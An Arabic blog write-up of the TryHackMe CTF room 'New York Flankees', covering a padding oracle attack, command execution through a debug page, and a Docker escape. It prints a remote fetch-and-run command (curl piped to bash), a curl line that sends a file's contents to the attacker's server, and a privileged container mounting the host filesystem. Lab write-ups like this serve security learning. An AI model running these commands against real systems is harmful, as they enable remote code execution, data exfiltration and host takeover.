---
title: حل غرفة newyorkflankees
date: 2024-08-08
description: تصعيد الصلاحيات مرتين!
image: https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1719465307426
tags: ["CTF","THM"]
categories: "CTFs"
---
# المقدمة

بسم الله الرحمن الرحيم، راح أشارككم طريقة تفكيري وحلي لغرفة new york flankees الموجودة على موقع [tryhackme](https://tryhackme.com). ملاحظة مهمة: إذا كنت تبغى تستفيد وماتضيع وقتك على الفاضي، لاتشوف حل أي تحدي إلا إذا بذلت كامل جهدك في حله، ولا تشوف حل التحدي بالكامل، لكن شوف فقط الجزئية اللي علقت عندها.

## فحص المداخل

طبيعي في أي تحدي CTF أول شيء تسويه إنك تفحص المداخل عشان تاخذ نظرة عامة عن الصندوق (virtual mechine)، راح استخدم rustscan عشانه سريع، غالبا ماراح تستخدمه على أهداف حقيقية عشان ماتبلع باند 

```bash
╭─ ඞ ~/thm ············································································
╰─λ rustscan -a 10.10.233.199
Open 10.10.233.199:22
Open 10.10.233.199:8080
```

ممتاز!، نلاحظ عندنا مدخلين (ssh-22,http-8080) خلينا ندخل موقع الويب ونشوف إيش راح نحصل.

## فحص الموقع

### الصفحة الرئيسية Blog

أول ما نخش الموقع راح نلاحظ كذا حاجة
![img](assets/img/Screenshot%20from%202024-07-16%2020-52-11.png)
في الأعلى راح نشوف ثلاث أزرار، خلينا نشوف السورس كود


![img](assets/img/Screenshot%20from%202024-07-16%2021-51-30.png)

إذا أنت مافهمت الكود الموجود هنا، أنصحك تاخذ كورس جافاسكربت أو كورس تطوير مواقع... راح يساعدك كثير صدقني. عموما، الكود الموجود أسفل الصفحة الرئيسية قاعد يتأكد ما إذا كان الشخص اللي يشوف الصفحة عنده كوكيز اسمها loggedin، إذا كان عنده هذي الكوكيز راح يتغير النص اللي في الزر في الأعلى يمين إلى DEBUG وراح يوجهك على صفحة ثانية exec.html أما إذا ماكانت الكوكيز موجودة راح يوجهك على صفحة تسجيل الدخول.

### الصفحة التجريبية stefan test

خلينا نروح على السورس كود على طول،
![img](assets/img/Screenshot%20from%202024-07-16%2022-05-27.png)

هنا عندنا شي مثير، الكود ذا راح يرسل طلب للنقطة api/debug/xxxx/ مكان الإكسات نلاحظ عندنا نص طويل، إذا قرأنا التعليقات اللي كاتبها راح نعرف أن هذا النص عبارة عن شفرة، السؤال هو إيش هي هذي الشفرة وكيف نفكها؟ تلاحظ من التعليق في سطر 69 أن هذا النص حمولة AES/CBC/PKCS إذا بحثت في قوقل ممكن يعدي عليك اسم oracle padding attack وهذا يا عزيزي ما تحتاج أن تبحث عنه وتفهمه عشان تفك التشفير، في الصفحة الرئيسية تشوف تلميح من الصورة (مكتوب فيها oracel)، هل فيه سكربتات جاهزة تأتمت (automate) هذه الثغرة؟.

### مابعد فك التشفير

بعد مايقارب 6 ساعات من البحث قدرت أفك التشفير، أولا: الحمولة المشفرة عبارة عن اسم مستخدم وكلمة سر. ثانيا: محتويات الحمولة هي جواب السؤال الأول. ملاحظة- فك الشفرة راح ياخذ وقت، لأنك راح ترسل 256 طلب للسيرفر عشان بايت واحد

![img](assets/img/Screenshot%20from%202024-07-17%2015-56-44.png)

### التحكم في السيرفر

بعد ما تطلع كلمة السر واسم المستخدم، سجل دخول وراح تاخذ العلم الأول وراح تحصل حقل يمديك من خلاله تنفذ أوامر على السيرفر

![img](assets/img/Screenshot from 2024-07-17 18-02-55.png)

أنا قعدت تقريبا 6 ساعات ثانية أحاول أحصل reverse shell لكن الطرق التقليدية ما نفعت، لاحظت إني أقدر أرسل طلب من الهدف إلى السيرفر حقي من خلال curl.

```bash
curl http://my_server/
```

حاولت إني أجرب الطرق التقليدية باستعمال  curl لكن أيضا بلا جدوى

```bash
curl http://my_server/shell.sh | bash
```
جاءت في بالي فكرة رهيبة، وهي إني أستخرج معلومات من السيرفر وأرسلها على السيرفر حقي باستخدام curl لكن أيضا بلا جدوى والسبب هو إني ما أعرف اسم أي ملف ، سوي ملف تجريبي وجرب عليه الأمر التالي عشان تفهم فكرتي

```bash
cat secret.txt | xargs -I input curl http://my_server/input
```
```bash
╭─ ඞ ~/thm ···························································································
╰─λ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.6.29.36 - - [17/Jul/2024 23:42:38] code 404, message File not found
10.6.29.36 - - [17/Jul/2024 23:42:38] "GET /you_see?,secret HTTP/1.1" 404 -

```
لكن بلا جدوى.
بعد تعديلات كثيرة، طلع الحل تافه جدا، السيرفر لسبب ما، مايستقبل الأنبوب | أو مايعتبره موجود، فالطريقة عشان تتفادى هذا العائق هي إنك تخزن الملف حق الحمولة في السيرفر بعدين تنفذ أمر باش على الحمولة

```bash
curl http://my_server/shell.sh --output (DO NOT USE '>') shell.sh
```
```bash
bash shell.sh
```

### العلم الثالث والرابع

الآن بعد ما صار عندنا "صدفة" في السيرفر، راح نبدأ رحلة البحث عن العلمين الأخيرة, ونلاحظ إننا الروت!

```bash
root@02e849f307cc:/# whoami
root
```
بما إننا في docker container راح نجرب الأمر التالي ونشوف النتيجة
```bash
root@02e849f307cc:/# env
HOSTNAME=02e849f307cc
JAVA_HOME=/usr/local/openjdk-11
PWD=/
CTF_USERNAME=XXXXXXX
HOME=/root
LANG=C.UTF-8
CTF_DOCKER_FLAG=XXXXXXXX العلم الثالث
CTF_RESOURCES=/app/src/resources
CTF_ENCRYPTION_IV=XXXXXXXXX
SHLVL=2
CTF_ENCRYPTION_KEY=XXXXXXXXXX
PATH=/usr/local/openjdk-11/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
CTF_ADMIN_PANEL_FLAG=XXXXXXXXXX
CTF_PASSWORD=XXXXXXXXXX
JAVA_VERSION=11.0.16
_=/usr/bin/env
```
ممتاز، باقي العلم الرابع وأروح أرقد، الصراحة ماعندي خلفية قوية عن "حاويات" دوكر لكن اللي أعرفه أن في بعض الأحيان يمديك تخرج منها، وهذا المطلوب منك يا عزيزي. خلينا نشوف إذا فيه حاويات ثانية
```bash
root@02e849f307cc:/# docker ps
CONTAINER ID   IMAGE                    COMMAND                  CREATED          STATUS          PORTS                                       NAMES
02e849f307cc   padding-oracle-app_web   "java -jar /app/ktor…"   2 months ago     Up 51 minutes   0.0.0.0:8080->8080/tcp, :::8080->8080/tcp   padding-oracle-app_web_1
```
مدام قدرنا نشوف الحاويات معناته يمدينا نسوي حاوية، إيش رأيك نسوي حاوية بكامل الصلاحيات؟. لكن قبل ما نسوي حاوية جديدة، خلينا نشوف إيش الصور المحملة عندنا (راح نستخدم الصور المحلية عشان نسوي حاوية جديدة عشان مافي نت في السيرفر).

```bash
root@02e849f307cc:/# docker images
REPOSITORY               TAG       IMAGE ID       CREATED         SIZE
padding-oracle-app_web   latest    cd6261dd9dda   2 months ago    1.01GB
<none>                   <none>    4187efabd0a5   2 months ago    704MB
gradle                   7-jdk11   d5954e1d9fa4   2 months ago    687MB
openjdk                  11        47a932d998b7   23 months ago   654MB
```
الآن نسوي الحاوية حقتنا.
```bash
docker -d -v /:/host --name escape --privileged --cap-add=ALL --pid=host --userns=host gradle:7-jdk11 sleep 3600
```
بعد ما سوينا الحاوية خلينا نشبك عليها ونجيب العلم الرابع عشان برقد.
```bash
docker exec -i (DO NOT USE -it) escape bash 
```
راح تلاحظ أن التيرمينال ماتطبع لك شي في البداية، معليك. الآن يا حبيبي مهمتك تطلع العلم اللي اسمه flag.txt أنصحك تشوف [هذا الفيديو](https://youtu.be/ZbHVRoWEwA8?si=v-xLFitDKETPSWqY) عشان تعرف كيف تطلعه.

# الخاتمة
الحمد لله على منه وإحسانه، الصراحة استمعت جدا وأنا أحل هذا التحدي وقعدت فوق ال 10 ساعات فيه مع إنه بعد ما حليته أحسه بسيط، إذا كان عندك اقتراح أو تعديل تواصل معي على [تويتر](https://x.com/VulnerK0) سويته جديد عشان المدونة ذي.<br> سبحان ربك رب العزة عما يصفون، وسلام على المرسلين، والحمد لله رب العالمين.